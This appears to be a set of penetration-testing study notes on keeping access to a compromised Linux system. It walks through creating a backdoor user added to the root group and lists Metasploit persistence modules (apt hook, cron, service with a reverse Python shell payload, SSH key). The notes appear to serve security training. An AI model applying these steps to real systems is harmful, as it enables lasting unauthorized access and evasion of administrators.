
+ Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

+ Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

+ The persistence techniques we can utilize will depend on the target configuration.

+ We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

### How to establish persistence ?

1. Gain initial access. In our case, we'll be exploiting `SSH`.

2. Upgrade the session to a `meterpreter` session.

3. Escalate privileges if required.

4. We'll now create a user which we can use to gain access to the system whenever we want. This requires the system to be running services like SSH or FTP, so that we can authenticate legitimately with the system.
```
useradd -m <username> -s /bin/bash
```

5. Now we'll add the backdoor user to `root` group, so that the user inherits permissions of the root group. 
```
usermod -aG root <username>
```

6.  Check if the user was added or not.
```
groups root
```

### `MSF` modules for persistence

1. Establishing persistence by running payload when package manager is used.
```
use exploit/linux/local/apt_package_manager_persistence
```
- This module is not ideal, as it will only run the payload when the package manager is run.

2. Using cron jobs to establish persistence.
```
use exploit/linux/local/cron_persistence 
```
- Cron Jobs can be easily detected by system administrators. 
- Default time is set to run every 60 secs.
- This might not work everytime.

3. Using service persistence. This will create a service and mark it for auto-restart.
```
use exploit/linux/service_persistence
```
- Set payload to `cmd/unix/reverse_python`

4. Creating a `SSH` key pair to establish persistence. This module will add an SSH key to a specified user and allow remote login via SSH. 
```
use post/linux/manage/sshkey_persistence
```





